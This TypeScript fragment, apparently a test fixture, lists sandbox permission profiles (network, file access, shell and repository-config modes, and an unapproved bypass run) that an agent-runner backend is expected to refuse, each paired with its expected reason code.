 * `compileProblems` checks the isolation of a non-`disabled` repository configuration only if it compiles, so the
 * refusal itself is pinned here: repository configuration `disabled` or `approved` in every compiled cell (FR-POL-04
 * cannot hold, owner decisions 26 and 46; a refusal is not a claim that project sources are inert), read-only files
 * with network `on`, network `allowlist`, a non-`broad` shell, and a bypass scope whose run is not approved.
 */
export const grokRefusedScopes: readonly {
  label: string;
  profile: ResolvedProfile;
  bypassApproved: boolean;
  reason: Ineligible["reason"];
}[] = [
  ...(["disabled", "approved"] as const).flatMap((mode) =>
    [
      ["strict", BYPASS_SCOPE],
      ["workspace (network on)", { ...BYPASS_SCOPE, network: { mode: "on" } }],
      ["read-only files", { ...BYPASS_SCOPE, files: { access: "read-only" } }],
    ].map(([label, scope]) => ({
      label: `${label}, repository_config ${mode}`,
      profile: privilegedProfile({ ...(scope as typeof BYPASS_SCOPE), repository_config: { mode } }),
      bypassApproved: true,
      reason: "CAPABILITY_MISSING" as const,
    })),
  ),
  {
    label: "read-only files, network on",
    profile: privilegedProfile({ ...BYPASS_SCOPE, files: { access: "read-only" }, network: { mode: "on" } }),
    bypassApproved: true,
    reason: "CAPABILITY_MISSING",
  },
  {
    label: "network allowlist",
    profile: privilegedProfile({ ...BYPASS_SCOPE, network: { mode: "allowlist", hosts: ["example.invalid"] } }),
    bypassApproved: true,
    reason: "CAPABILITY_MISSING",
  },
  {
    label: "shell none",
    profile: privilegedProfile({ ...BYPASS_SCOPE, shell: { mode: "none" } }),
    bypassApproved: true,
    reason: "CAPABILITY_MISSING",
  },
  {
    label: "bypass scope, run not approved",
    profile: PRIVILEGED_BYPASS_PROFILE,
    bypassApproved: false,
    reason: "PROFILE_UNSUPPORTED",
  },
];
